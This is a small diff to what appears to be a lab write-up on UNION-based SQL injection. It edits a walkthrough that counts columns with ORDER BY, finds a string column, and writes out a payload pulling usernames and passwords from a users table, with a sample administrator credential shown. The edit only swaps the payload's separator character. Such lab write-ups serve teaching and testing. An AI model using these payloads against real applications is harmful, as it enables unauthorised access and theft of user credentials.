@@ -18,7 +18,7 @@ After I try, I can see `' ORDER BY 3--` display error. That means it has 2 colum
 
 Now I determine which column is string data: `' UNION SELECT NULL,'a'--`
 
-Now exploit the payload: `' UNION SELECT NULL, username || '`' || password FROM users--`
+Now exploit the payload: `' UNION SELECT NULL, username || '~' || password FROM users--`
 
 It will show you the username and password like this: `administrator~c33dy80c5hdjybojdbzf`, use it to log in and we done.
 
